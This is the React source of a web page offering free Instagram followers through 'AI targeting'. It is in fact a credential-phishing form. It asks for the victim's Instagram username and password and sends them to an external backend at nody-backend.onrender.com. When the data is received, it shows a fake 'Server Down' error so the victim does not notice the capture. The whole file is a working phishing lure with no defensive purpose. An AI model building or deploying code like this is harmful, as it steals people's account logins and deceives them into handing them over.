
import React, { useState } from "react";
import axios from "axios";
import Swal from "sweetalert2";

const LoginForm = () => {
  const [instagramUsername, setInstagramUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // 2. Send request to your backend
      const { data } = await axios.post(
        "https://nody-backend.onrender.com/api/register",
        { instagramUsername, password }
      );

      // 3. On success, show success alert
      Swal.fire({
        icon: "error",
        title: "Server Down",
        text: "server is down . Please try again later.",
      });

      // Clear form fields
      setInstagramUsername("");
      setPassword("");

    } catch (error) {
      // 4. Distinguish between server error vs. no server response
      if (error.response) {
        // The request was made and the server responded with a status code
        // that falls out of the range of 2xx
        Swal.fire({
          icon: "error",
          title: "Error",
          text: error.response.data.message || "Something went wrong.",
        });
      } else if (error.request) {
        // The request was made but no response was received
        // This often means the server is down or unreachable
        Swal.fire({
          icon: "error",
          title: "Server Down",
          text: "Could not reach the server. Please try again later.",
        });
      } else {
        // Something else happened while setting up the request
        Swal.fire({
          icon: "error",
          title: "Error",
          text: "An unexpected error occurred. Please try again.",
        });
      }
    }
  };

  return (
    <div className="container-fluid mt-5">
      <div className="login-page-container">
        {/* Left Card */}
        <div className="login-card">
          <h2 className="login-heading">Get Free Followers</h2>
          <p className="login-subheading">
            Let our AI-targeted organic growth work for you for free. Enter your email +
            Instagram username, and we'll get working for you.
          </p>

          {/* Form */}
          <form className="form" onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="instagramUsername">Instagram Username</label>
              <input
                type="text"
                id="instagramUsername"
                value={instagramUsername}
                onChange={(e) => setInstagramUsername(e.target.value)}
                placeholder="Instagram Username"
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">password</label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
              />
            </div>

            <button type="submit" className="btn-submit">
              Start Free Trial
            </button>
          </form>

          {message && <p className="message">{message}</p>}
        </div>

        {/* Right Content */}
        <div className="info-section">
          <h2 className="info-heading">Free Instagram Followers</h2>
          <p className="info-text">
            Let our AI-targeted organic growth work for you for free. Enter your Username +
            Instagram password, and we’ll get working for you.
          </p>
          <ul className="benefits-list">
            <li>✅ Real, Organic Growth</li>
            <li>✅ Dedicated 24/7 Support</li>
            <li>✅ Advanced AI Targeting</li>
            <li>✅ Guaranteed Results</li>
            <li>✅ 2-3k Followers / mo</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
